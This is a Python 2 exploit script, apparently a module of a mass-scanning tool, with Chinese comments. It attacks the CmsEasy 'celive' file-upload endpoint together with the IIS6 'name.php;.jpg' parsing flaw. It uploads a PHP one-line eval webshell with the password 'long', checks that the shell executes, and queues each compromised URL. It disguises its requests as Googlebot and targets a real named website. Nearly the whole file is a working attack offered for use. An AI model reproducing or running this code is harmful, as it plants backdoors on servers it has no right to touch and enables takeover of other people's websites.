#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#cmseasy文件上传+IIS6解释漏洞
#http://hi.baidu.com/alalmn/item/7129933b1944644b3075a1ee
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
import urllib2
import httplib
import threading
import requests
import re
import sys
sys.path.append('..')
import Class_Queue
import yijuhua_CS

class cms(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #线程ID

    def run(self):
        try:
            self.cmseasy_IIS6_jx(self.url)  #cmseasy文件上传+IIS6解释漏洞
            #print "%s--cmseasy_IIS6_jx!!!!!"%(self.url)
        except Exception,e:
            #print e
            return 0

    def URL_DZ(self,URL):  #获取网页内容
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except Exception,e:
            #print e
            return 0

    def http_get(self,host,admin):  #验证地址是否存在
        #print host+"----"+admin
        try:
            connection = httplib.HTTPConnection(host,80,timeout=10)
            connection.request("GET",admin)
            response = connection.getresponse()
            if response.status==200:  #只能显示单个文件    不能显示文件夹
                #SQLdata="http://"+host+admin+"    %s %s"%(response.status, response.reason)
                #print SQLdata
                return 1
            return 0
        except Exception,e:
            #print e
            return 0

    def cmseasy_IIS6_jx(self,url):  #cmseasy文件上传+IIS6解释漏洞
        try:
            #http://www.skyscom.com/celive/live/doajaxfileupload.php
            data="http://%s/celive/live/doajaxfileupload.php"%(url)
            if 'jpg' in self.URL_DZ(data):  #检查是否支持JPG
                #print "-cms-cmseasy_IIS6_jx-open jpg %s"%(data)
                EXP_list=[0,url,"exp","exp_cmseasy_IIS6_jx",data,"",""]
                #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                #上传文件
                #data="<?php @eval($_POST['long']);?>"  #一句话
                files = {'fileToUpload': open('long.php;.jpg', 'rb')}
                r = requests.post(data, files=files)
                data=r.text

                name=[]
                try:
                    p = re.compile(r'target=.+?>(.*?)</a>')   #结果 [u'CELIVE-Q7duV0tNj8.php;.jpg']
                    sarr = p.findall(data)#找出一条
                    name=sarr[0]
                except:
                    #print "!"
                    return 0
                #print name
                data="http://%s/celive/uploadfiles/%s"%(url,name)
                if self.http_get(url,"/celive/uploadfiles/"+name):  #验证地址是否存在
                    if yijuhua_CS.yijuhua_cs("php",data,"long"):   #ASP还是PHP  ,URL地址 ，密码
                        #是
                        EXP_list=[1,url,"exp","exp_cmseasy_IIS6_jx",data,"long","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                    else:
                        #否
                        EXP_list=[0,url,"exp","exp_cmseasy_IIS6_jx",data,"long","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列


        except Exception,e:
            #print e
            return 0

################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(cms("www.skyscom.com"))

    for t in threads:
        t.start()



